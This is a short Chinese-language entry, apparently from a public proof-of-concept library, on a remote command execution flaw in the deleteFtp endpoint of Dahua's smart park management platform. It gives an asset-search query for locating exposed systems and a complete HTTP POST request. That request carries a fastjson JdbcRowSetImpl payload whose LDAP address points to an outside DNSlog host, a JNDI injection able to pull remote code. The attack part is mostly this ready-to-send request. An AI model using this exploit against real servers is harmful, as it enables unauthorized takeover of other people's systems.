---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 大华智慧园区综合管理平台deleteFtp 接口远程命令执行

# 一、漏洞简介
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。大华智慧园区综合管理平台deleteFtp 接口远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
<font style="color:rgb(51, 51, 51);">deleteFtp接口存在命令执行漏洞，可执行LDAP解析等。</font>

```plain
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Length: 243
Content-Type: application/json
Accept-Encoding: gzip, deflate, br

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://tcpj5b.dnslog.cn","autoCommit":true}}}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/il26hyyl70fmzm9e>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
